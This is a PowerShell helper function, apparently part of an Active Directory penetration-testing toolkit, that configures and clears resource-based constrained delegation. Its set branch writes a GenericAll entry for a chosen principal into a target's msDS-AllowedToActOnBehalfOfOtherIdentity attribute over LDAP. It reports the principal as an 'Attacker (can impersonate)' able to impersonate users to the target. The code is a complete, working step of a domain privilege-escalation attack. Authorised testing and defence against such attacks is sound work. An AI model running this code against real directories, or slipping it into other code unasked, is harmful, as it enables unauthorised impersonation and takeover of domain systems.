function Invoke-RBCDOperation {
<#
.SYNOPSIS
    Helper function for Resource-Based Constrained Delegation (RBCD) operations.

.DESCRIPTION
    Invoke-RBCDOperation is a centralized helper function that handles RBCD configuration
    for both user and computer objects. It eliminates code duplication between
    Set-DomainUser and Set-DomainComputer.

    Uses ModifyRequest via $Script:LdapConnection for all LDAP modifications,
    ensuring compatibility with all authentication methods including Kerberos PTT.

    Supports:
    - Adding RBCD principals (SetRBCD)
    - Clearing RBCD principals (ClearRBCD) - single, specific, or all

.PARAMETER TargetDN
    Distinguished Name of the target object.

.PARAMETER TargetSAMAccountName
    sAMAccountName of the target object.

.PARAMETER TargetType
    Type of target object: 'User' or 'Computer'.

.PARAMETER AddRBCD
    Principal to add for RBCD delegation.

.PARAMETER ClearRBCD
    Switch to clear RBCD configuration.

.PARAMETER Principal
    Specific principal to remove (with -ClearRBCD).

.PARAMETER Force
    Remove all principals (with -ClearRBCD).

.PARAMETER PassThru
    Return result object instead of console output.

.PARAMETER ConnectionParams
    Hashtable with Domain, Server, Credential for LDAP operations.

.NOTES
    Author: Alexander Sturz (@_61106960_)
    Internal helper function - not exported directly.
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$TargetDN,

        [Parameter(Mandatory)]
        [string]$TargetSAMAccountName,

        [Parameter(Mandatory)]
        [ValidateSet('User', 'Computer')]
        [string]$TargetType,

        [Parameter(ParameterSetName='Set', Mandatory)]
        [string]$AddRBCD,

        [Parameter(ParameterSetName='Clear', Mandatory)]
        [switch]$ClearRBCD,

        [Parameter(ParameterSetName='Clear')]
        [string]$Principal,

        [Parameter(ParameterSetName='Clear')]
        [switch]$Force,

        [switch]$PassThru,

        [hashtable]$ConnectionParams = @{}
    )

    $FunctionPrefix = "[Invoke-RBCDOperation]"

    if ($PSCmdlet.ParameterSetName -eq 'Set') {
        # ===== SetRBCD Operation =====
        Write-Log "$FunctionPrefix Configuring RBCD for: $TargetSAMAccountName"

        try {
            # Resolve delegate principal (any principal type - Computer, User, gMSA, etc.)
            # Get-DomainObject now supports cross-domain queries (DOMAIN\username)
            $DelegateObject = @(Get-DomainObject -Identity $AddRBCD -Properties objectSid @ConnectionParams)[0]
            if (-not $DelegateObject) {
                throw "Principal '$AddRBCD' not found"
            }

            # objectSid is returned as string (S-1-5-...) by Get-DomainObject
            $DelegateSID = New-Object System.Security.Principal.SecurityIdentifier($DelegateObject.objectSid)

            # Read existing RBCD configuration (use Get-DomainObject -Raw to get unprocessed bytes)
            $ExistingRBCD = @(Get-DomainObject -Identity $TargetDN -Properties 'msDS-AllowedToActOnBehalfOfOtherIdentity' -Raw @ConnectionParams)[0]

            # RBCD uses a RAW Security Descriptor, not an AD-specific one
            # The msDS-AllowedToActOnBehalfOfOtherIdentity attribute stores a binary SD
            # where the DACL contains ACEs granting "GenericAll" (0x10000000) to allowed principals

            $AlreadyExists = $false

            # Get existing SD bytes from LDAP result (Get-DomainObject -Raw returns byte[])
            $ExistingSDBytes = $null
            if ($ExistingRBCD -and $ExistingRBCD.'msDS-AllowedToActOnBehalfOfOtherIdentity') {
                $ExistingSDBytes = [byte[]]$ExistingRBCD.'msDS-AllowedToActOnBehalfOfOtherIdentity'
                Write-Log "$FunctionPrefix Found existing RBCD data via LDAP: $($ExistingSDBytes.Length) bytes"
            } else {
                Write-Log "$FunctionPrefix No existing RBCD data found"
            }

            if ($ExistingSDBytes -and $ExistingSDBytes.Length -gt 0) {
                # Parse existing SD using RawSecurityDescriptor
                $RawSD = New-Object System.Security.AccessControl.RawSecurityDescriptor([byte[]]$ExistingSDBytes, 0)
                Write-Log "$FunctionPrefix Extending existing RBCD configuration with $($RawSD.DiscretionaryAcl.Count) existing ACE(s)"

                # Check if ACE for this SID already exists
                foreach ($ace in $RawSD.DiscretionaryAcl) {
                    # RawAcl returns GenericAce objects, cast to CommonAce to access SecurityIdentifier
                    $commonAce = [System.Security.AccessControl.CommonAce]$ace
                    if ($commonAce.SecurityIdentifier.Value -eq $DelegateSID.Value) {
                        $AlreadyExists = $true
                        Write-Log "$FunctionPrefix ACE for $DelegateSID already exists"
                        break
                    }
                }

                if (-not $AlreadyExists) {
                    # Add new ACE: GenericAll (0x10000000) for the delegate SID
                    $RawSD.DiscretionaryAcl.InsertAce(
                        $RawSD.DiscretionaryAcl.Count,
                        (New-Object System.Security.AccessControl.CommonAce(
                            [System.Security.AccessControl.AceFlags]::None,
                            [System.Security.AccessControl.AceQualifier]::AccessAllowed,
                            0x10000000,  # GenericAll
                            $DelegateSID,
                            $false,
                            $null
                        ))
                    )
                }
            } else {
                Write-Log "$FunctionPrefix Creating new RBCD configuration"

                # Create new RawSecurityDescriptor with empty DACL
                $RawSD = New-Object System.Security.AccessControl.RawSecurityDescriptor("O:BAD:")

                # Create DACL with single ACE granting GenericAll to delegate SID
                $RawSD.DiscretionaryAcl = New-Object System.Security.AccessControl.RawAcl(
                    [System.Security.AccessControl.RawAcl]::AclRevision,
                    1
                )
                $RawSD.DiscretionaryAcl.InsertAce(
                    0,
                    (New-Object System.Security.AccessControl.CommonAce(
                        [System.Security.AccessControl.AceFlags]::None,
                        [System.Security.AccessControl.AceQualifier]::AccessAllowed,
                        0x10000000,  # GenericAll
                        $DelegateSID,
                        $false,
                        $null
                    ))
                )
            }

            # Convert RawSecurityDescriptor to binary form
            $SDBytes = New-Object byte[] $RawSD.BinaryLength
            $RawSD.GetBinaryForm($SDBytes, 0)

            # Set msDS-AllowedToActOnBehalfOfOtherIdentity via ModifyRequest
            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
            $ModifyRequest.DistinguishedName = $TargetDN

            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
            $Modification.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity"
            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
            $Modification.Add($SDBytes) | Out-Null

            $ModifyRequest.Modifications.Add($Modification) | Out-Null

            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
            }

            # Resolve delegate name for output
            $DelegateName = if ($DelegateObject.sAMAccountName) { $DelegateObject.sAMAccountName } else { $AddRBCD }

            if ($PassThru) {
                return [PSCustomObject]@{
                    Operation = "SetRBCD"
                    $TargetType = $TargetSAMAccountName
                    DistinguishedName = $TargetDN
                    DelegateFrom = $DelegateName
                    AlreadyExisted = $AlreadyExists
                    Success = $true
                    Message = if ($AlreadyExists) { "RBCD entry already existed" } else { "RBCD successfully configured. $DelegateName can now impersonate users to $TargetSAMAccountName" }
                }
            } else {
                if ($AlreadyExists) {
                    Show-Line "RBCD entry already exists for $DelegateName on: $TargetSAMAccountName" -Class Note
                } else {
                    Show-Line "Successfully configured RBCD on target: $TargetSAMAccountName" -Class Hint
                    Show-KeyValue "Attacker (can impersonate):" $DelegateName
                    Show-KeyValue "Target (receives impersonation):" $TargetSAMAccountName
                }
            }
        } catch {
            throw "Failed to configure RBCD: $_"
        }
    }
    else {
        # ===== ClearRBCD Operation =====
        Write-Log "$FunctionPrefix Clearing RBCD configuration for: $TargetSAMAccountName"

        try {
            # Read existing RBCD configuration (use Get-DomainObject -Raw to get unprocessed bytes)
            $ExistingRBCD = @(Get-DomainObject -Identity $TargetDN -Properties 'msDS-AllowedToActOnBehalfOfOtherIdentity' -Raw @ConnectionParams)[0]

            # Get existing SD bytes from LDAP result (Get-DomainObject -Raw returns byte[])
            $ExistingSDBytes = $null
            if ($ExistingRBCD -and $ExistingRBCD.'msDS-AllowedToActOnBehalfOfOtherIdentity') {
                $ExistingSDBytes = [byte[]]$ExistingRBCD.'msDS-AllowedToActOnBehalfOfOtherIdentity'
            }

            if (-not $ExistingSDBytes -or $ExistingSDBytes.Length -eq 0) {
                if ($PassThru) {
                    return [PSCustomObject]@{
                        Operation = "ClearRBCD"
                        $TargetType = $TargetSAMAccountName
                        DistinguishedName = $TargetDN
                        Success = $true
                        Message = "No RBCD configuration to clear"
                    }
                } else {
                    Show-Line "No RBCD configuration found on: $TargetSAMAccountName" -Class Note
                }
                return $null
            }

            # Parse existing SD to get list of principals
            $RawSD = New-Object System.Security.AccessControl.RawSecurityDescriptor([byte[]]$ExistingSDBytes, 0)
            $ACECount = $RawSD.DiscretionaryAcl.Count
            Write-Log "$FunctionPrefix Found $ACECount RBCD ACE(s)"

            # Build list of configured principals with resolved names
            $ConfiguredPrincipals = @()
            foreach ($ace in $RawSD.DiscretionaryAcl) {
                # Cast GenericAce to CommonAce to access SecurityIdentifier
                $CommonAce = [System.Security.AccessControl.CommonAce]$ace
                $PrincipalSID = $CommonAce.SecurityIdentifier.Value
                Write-Log "$FunctionPrefix Processing ACE for SID: $PrincipalSID"
                $PrincipalName = ConvertFrom-SID -SID $PrincipalSID
                Write-Log "$FunctionPrefix Resolved SID $PrincipalSID to: $PrincipalName"
                if (-not $PrincipalName) { $PrincipalName = $PrincipalSID }
                $ConfiguredPrincipals += [PSCustomObject]@{
                    SID = $PrincipalSID
                    Name = $PrincipalName
                    ACE = $CommonAce
                }
            }

            # Decision logic based on parameters and ACE count
            if ($Principal) {
                # Remove specific principal only
                $TargetSID = ConvertTo-SID -Identity $Principal
                if (-not $TargetSID) {
                    $TargetSID = $Principal
                }

                # Match by SID, exact name, or name without domain prefix
                # Also handle computer accounts with/without trailing $
                $PrincipalInput = $Principal
                $PrincipalWithDollar = if ($Principal -notmatch '\$$') { "${Principal}`$" } else { $Principal }

                # Build -like patterns
                $LikePatternInput = '*\' + $PrincipalInput
                $LikePatternDollar = '*\' + $PrincipalWithDollar

                Write-Log "$FunctionPrefix Matching principal: Input='$PrincipalInput', WithDollar='$PrincipalWithDollar'"

                $PrincipalToRemove = $ConfiguredPrincipals | Where-Object {
                    ($_.SID -eq $TargetSID) -or
                    ($_.Name -eq $PrincipalInput) -or
                    ($_.Name -like $LikePatternInput) -or
                    ($_.Name -like $LikePatternDollar) -or
                    ($_.Name -eq $PrincipalWithDollar)
                } | Select-Object -First 1

                if (-not $PrincipalToRemove) {
                    if ($PassThru) {
                        return [PSCustomObject]@{
                            Operation = "ClearRBCD"
                            $TargetType = $TargetSAMAccountName
                            DistinguishedName = $TargetDN
                            Success = $false
                            Message = "Principal '$Principal' not found in RBCD configuration"
                            ExistingPrincipals = $ConfiguredPrincipals
                        }
                    } else {
                        Write-Warning "[!] Principal '$Principal' not found in RBCD configuration on: $TargetSAMAccountName"
                        Show-EmptyLine
                        Show-Line "Existing RBCD principals:" -Class Hint
                        foreach ($configuredPrincipal in $ConfiguredPrincipals) {
                            Show-KeyValue "Principal:" "$($configuredPrincipal.Name) ($($configuredPrincipal.SID))"
                        }
                    }
                    return $null
                }

                # Remove ACE for this principal from DACL
                $DaclCount = [int]$RawSD.DiscretionaryAcl.Count
                $NewDACL = New-Object System.Security.AccessControl.RawAcl(
                    [System.Security.AccessControl.RawAcl]::AclRevision,
                    ($DaclCount - 1)
                )
                $aceIndex = 0
                foreach ($ace in $RawSD.DiscretionaryAcl) {
                    $CommonAce = [System.Security.AccessControl.CommonAce]$ace
                    if ($CommonAce.SecurityIdentifier.Value -ne $PrincipalToRemove.SID) {
                        $NewDACL.InsertAce($aceIndex, $ace)
                        $aceIndex++
                    }
                }

                # Write updated or cleared RBCD via ModifyRequest
                $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                $ModifyRequest.DistinguishedName = $TargetDN

                $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                $Modification.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity"

                if ($NewDACL.Count -eq 0) {
                    # No ACEs left - clear the attribute
                    $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete
                } else {
                    # Replace with updated SD
                    $RawSD.DiscretionaryAcl = $NewDACL
                    $SDBytes = New-Object byte[] $RawSD.BinaryLength
                    $RawSD.GetBinaryForm($SDBytes, 0)
                    $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                    $Modification.Add($SDBytes) | Out-Null
                }

                $ModifyRequest.Modifications.Add($Modification) | Out-Null

                $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                    throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                }

                if ($PassThru) {
                    return [PSCustomObject]@{
                        Operation = "ClearRBCD"
                        $TargetType = $TargetSAMAccountName
                        DistinguishedName = $TargetDN
                        RemovedPrincipal = $PrincipalToRemove.Name
                        RemainingCount = $NewDACL.Count
                        Success = $true
                        Message = "RBCD entry for '$($PrincipalToRemove.Name)' removed"
                    }
                } else {
                    Show-Line "Successfully removed '$($PrincipalToRemove.Name)' from RBCD configuration on: $TargetSAMAccountName" -Class Hint
                }

            } elseif ($ACECount -eq 1) {
                # Only one entry - delete attribute via ModifyRequest
                $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                $ModifyRequest.DistinguishedName = $TargetDN

                $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                $Modification.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity"
                $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete

                $ModifyRequest.Modifications.Add($Modification) | Out-Null

                $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                    throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                }

                if ($PassThru) {
                    return [PSCustomObject]@{
                        Operation = "ClearRBCD"
                        $TargetType = $TargetSAMAccountName
                        DistinguishedName = $TargetDN
                        ClearedCount = 1
                        Success = $true
                        Message = "RBCD configuration successfully cleared"
                    }
                } else {
                    Show-Line "Successfully cleared RBCD configuration from: $TargetSAMAccountName" -Class Hint
                }

            } elseif ($Force) {
                # Multiple entries + Force - delete attribute via ModifyRequest
                $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                $ModifyRequest.DistinguishedName = $TargetDN

                $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                $Modification.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity"
                $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete

                $ModifyRequest.Modifications.Add($Modification) | Out-Null

                $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                    throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                }

                if ($PassThru) {
                    return [PSCustomObject]@{
                        Operation = "ClearRBCD"
                        $TargetType = $TargetSAMAccountName
                        DistinguishedName = $TargetDN
                        ClearedCount = $ACECount
                        Success = $true
                        Message = "All $ACECount RBCD entries successfully cleared"
                    }
                } else {
                    Show-Line "Successfully cleared all $ACECount RBCD entries from: $TargetSAMAccountName" -Class Hint
                }

            } else {
                # Multiple entries, no Force, no specific principal - show entries and don't delete
                if ($PassThru) {
                    return [PSCustomObject]@{
                        Operation = "ClearRBCD"
                        $TargetType = $TargetSAMAccountName
                        DistinguishedName = $TargetDN
                        PrincipalCount = $ACECount
                        ExistingPrincipals = $ConfiguredPrincipals
                        Success = $false
                        Message = "Multiple principals found. Use -Principal <name> or -Force to proceed."
                    }
                } else {
                    Write-Warning "[!] Multiple RBCD principals ($ACECount) found on: $TargetSAMAccountName"
                    Show-EmptyLine
                    Show-Line "To remove a specific principal, use: -Principal <name>" -Class Note
                    Show-Line "To remove ALL principals, use: -Force" -Class Note
                    Show-EmptyLine
                    Show-Line "Existing RBCD principals:" -Class Hint

                    $index = 1
                    foreach ($configuredPrincipal in $ConfiguredPrincipals) {
                        Show-KeyValue "[$index] Principal:" "$($configuredPrincipal.Name)"
                        Show-KeyValue "    SID:" "$($configuredPrincipal.SID)"
                        Show-EmptyLine
                        $index++
                    }
                }
            }
        } catch {
            throw "Failed to clear RBCD: $_"
        }
    }
}
